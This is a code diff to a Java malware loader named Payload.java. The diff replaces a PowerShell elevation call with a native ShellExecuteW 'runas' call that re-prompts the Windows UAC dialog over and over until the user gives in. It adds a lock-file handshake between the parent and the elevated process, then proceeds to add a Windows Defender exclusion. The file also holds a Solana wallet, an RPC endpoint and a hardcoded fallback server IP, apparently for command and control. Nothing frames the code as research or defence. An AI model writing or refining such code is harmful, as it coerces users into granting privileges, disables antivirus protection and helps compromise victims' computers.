@@ -1,4 +1,5 @@
 // language: Java, file: payload/Payload.java
+import com.sun.jna.*;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -7,6 +8,11 @@ import java.util.Base64;
 import java.util.zip.*;
 
 public class Payload {
+    public interface Shell32 extends Library {
+        Shell32 INSTANCE = Native.load("shell32", Shell32.class);
+        int ShellExecuteW(Pointer hwnd, String lpOperation, String lpFile, String lpParameters, String lpDirectory, int nShowCmd);
+    }
+
     private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
     private static final String SOLANA_RPC = "https://api.devnet.solana.com";
     private static final String FALLBACK_SERVER = "95.182.96.216";
@@ -142,34 +148,40 @@ public class Payload {
             String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
             String javaExe = javaHome + "\\bin\\javaw.exe";
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
-            
+            String appData = System.getenv("APPDATA");
+            File lockFile = new File(appData, "loader\\.lock");
+
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            // We use PowerShell to spawn the UAC prompt. 
-            // Removing "-WindowStyle Hidden" allows Windows to draw the UAC dialog.
-            String psCommand = String.format(
-                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
-                javaExe, jarPath, key, ip
-            );
+            String cmdArgs = String.format("-jar \"%s\" %s %s", jarPath, key, ip);
+            
+            // Keep the lock file open. The elevated process will delete it.
+            FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
-                log("Triggering UAC via PowerShell...");
+                log("Triggering UAC...");
                 
-                // Fire the UAC prompt
-                Process p = new ProcessBuilder(
-                    "powershell.exe", "-NoProfile", "-Command", psCommand
-                ).start();
+                // Fire the native Windows UAC prompt instantly
+                int result = Shell32.INSTANCE.ShellExecuteW(null, "runas", javaExe, cmdArgs, null, 1);
                 
-                // Wait for the user to click Yes/No.
-                // If they click Yes, the elevated Java process will grab the lock file and kill this parent.
-                // If they click No, PowerShell exits, and we loop instantly.
-                p.waitFor(); 
-                
-                log("UAC Denied. Retrying...");
-                
-                // Small delay to prevent 100% CPU usage while looping
-                Thread.sleep(500); 
+                if (result <= 32) {
+                    // User clicked "No"
+                    log("UAC Denied. Instantly retrying...");
+                    Thread.sleep(100); // 100ms to prevent CPU spiking
+                } else {
+                    // User clicked "Yes" (or prompt is still open). 
+                    // Check every 10ms if the elevated process killed the lock file.
+                    for (int i = 0; i < 1500; i++) {
+                        if (!lockFile.exists() || lockFile.delete()) {
+                            log("Lock file deleted. UAC Accepted. Parent exiting.");
+                            lockStream.close();
+                            System.exit(0);
+                        }
+                        Thread.sleep(10);
+                    }
+                    log("UAC timed out. Retrying...");
+                }
             }
         } catch (Exception e) {
             log("UAC Error: " + e.toString());
@@ -181,6 +193,13 @@ public class Payload {
             log("Executing payload...");
             String appData = System.getenv("APPDATA");
             File loaderDir = new File(appData, "loader");
+            
+            // Kill the parent process instantly by deleting the lock file
+            File lock = new File(loaderDir, ".lock");
+            if (lock.exists()) {
+                lock.delete();
+                log("Deleted .lock file to notify parent.");
+            }
 
             log("Adding AV exclusion...");
             String regPath = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
